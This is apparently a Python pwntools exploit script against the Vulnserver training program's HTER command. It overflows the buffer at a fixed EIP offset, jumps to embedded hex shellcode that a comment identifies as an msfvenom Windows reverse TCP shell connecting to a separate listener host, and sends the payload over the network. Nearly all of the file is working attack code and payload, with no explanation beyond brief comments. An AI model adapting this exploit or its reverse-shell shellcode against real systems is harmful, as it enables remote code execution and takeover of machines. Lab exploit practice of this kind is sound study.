from pwn import * # pylint: disable=unused-wildcard-import
context.log_level = 'debug' # pylint: disable=assigning-non-slot

# IP and port of the target (Vulnserver).
ip = "10.0.2.15"
port = 9999

cmd= "HTER "
offset_eip = 2046
eip = "AF115062" # Address of instruction we want to run (Ex. jmp esp).

# Here we put the shellcode we want to execute.
offset_sc = offset_eip + 8
shellcode = "90"*16
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 EXITFUNC=thread -f hex -b "\x00\x0a"
shellcode += "dbded97424f45abea4f58f9d31c9b15283c20431721303d6e66d68eae1f09312f2941af7c394797c732509d078ce5fc00ba277e7bc09aec63d219249be38c7a9fff21aa838eed7f8916445ec96315687e5d4de74bdd7cf2bb581cfca1aba59d47f87106f4b73a3b9857c0884298f50c18e70273bed0d30f88fc9b51a37996ec6c94ee88dc63b7ec9caba5362f63752a47e037160dad7183186b625216966802a8473b971c1b0f08911df83fa234038940f09e6636f205efb8ecb9fd2549fcf4c7ca09b8c81750bdc2d26ec8c8d9684c601c8b5e9cb615f109c87a0185af0a21c735c2afa194c7a55b6f5272d27f9fd486771f2ad26727fbddf72ca9f768ce0b7151f6f47533c381034f231f4a8adebea302bd3aeee88da2f62b4f83fba35456b126013c5d4dad5bf8eb1bf5756fa7f2157d709cde68e4ff2c746588b35f7a746fe174a420bb0d307b6dde3f2f5db67f6851f777383643f68f9f5aa8eaef6fe"

# Create our payload.
payload = fit({
    0:cmd,
    offset_eip:eip,
    offset_sc:shellcode
    },length=5000,filler=de_bruijn(alphabet=b"123456789ABCDEF"))
# pwn cyclic -a "123456789ABCDEF" -l "37B1"
io = remote(ip,port)
io.readline()
io.sendline(payload)

# filename = "filename.ext"

# with open(filename,"w+") as f:
#     f.write(payload)
